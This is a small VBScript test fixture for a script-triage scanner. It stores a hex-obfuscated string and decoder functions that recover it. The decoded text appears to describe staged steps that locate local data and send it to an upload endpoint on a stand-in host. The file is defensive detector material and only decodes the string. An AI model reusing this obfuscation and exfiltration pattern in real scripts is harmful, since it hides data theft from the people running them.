Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_f0bc714f = "2b:55:2b:25:2d:58:59:5a:23:58:55:63:60:64:69:23:58:5d:60:55:6a:62:5d:22:59:60:64:61:55:6c:59:22:28:29:28:27:55:56:5a:28:57:27:23:23:2e:67:64:68:68:5c:31:60:66:69:53:58:55:63:60:64:69:70:68:55:58:22:28:29:28:27:55:56:5a:28:57:27:21:59:5b:55:68:67:50:56:55:40:67:67:59:66:68:62:69:3c:50:57:5d:60:56:69:44:50:67:66:59:67:49:50:2e:37:31:5c:68:55:64:53:59:60:5d:5a:70:28:29:28:27:55:56:5a:28:57:27:23:56:55:40:67:67:59:66:68:62:69:3c:31:68:62:59:5b:55:53:66:59:67:69:70:68:55:58:22:2a:2c:5a:26:2c:58:55:24:23:58:5d:60:55:6a:62:5d:22:59:60:64:61:55:6c:59:22:28:29:28:27:55:56:5a:28:57:27:23:23:2e:67:64:68:68:5c:31:60:66:69:70:28:29:28:27:55:56:5a:28:57:27:21:62:5b:5d:55:64:61:55:57:31:58:5d:53:62:5b:5d:55:64:61:55:57:70:26:31:68:62:69:63:57:53:59:5b:55:68:67:70:59:6c:59:22:6d:57:5d:60:63:44:6d:68:5d:66:69:57:59:47:5b:5d:5a:62:63:37:31:66:59:68:64:55:58:55:70:59:68:63:61:59:66:53:58:55:63:60:64:69:20:66:59:5a:67:62:55:66:68:53:59:66:55:64:59:66:64:20:60:55:57:63:60:53:59:68:55:57:63:60:31:67:64:59:68:67:70:25:31:6a"
Const Codec_f0bc714f = "reversed_hex|subtract_modulo_256|0c"

Function Load_f0bc714f()
  Dim parts, result(), i
  parts = Split(Material_f0bc714f, ":")
  ReDim result(UBound(parts))
  For i = 0 To UBound(parts)
    result(UBound(parts) - i) = CInt("&H" & parts(i))
  Next
  Load_f0bc714f = result
End Function

Function Decode_f0bc714f(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(i) = (s(i) + 12) Mod 256
  Next
  Decode_f0bc714f = result
End Function

Function Recover_f0bc714f()
  Dim s, d, t, n, i, p, e, q
  n = Join(Array("north", "south"), ":")

  s = Load_f0bc714f()

  Do

    d = Decode_f0bc714f(s)

    Exit Do

  Loop

  t = ""

  For i = 0 To UBound(d)

    t = t & Chr(d(i))

  Next
  Recover_f0bc714f = t
End Function

Function Inspect_f0bc714f()
  Inspect_f0bc714f = Recover_f0bc714f()
End Function
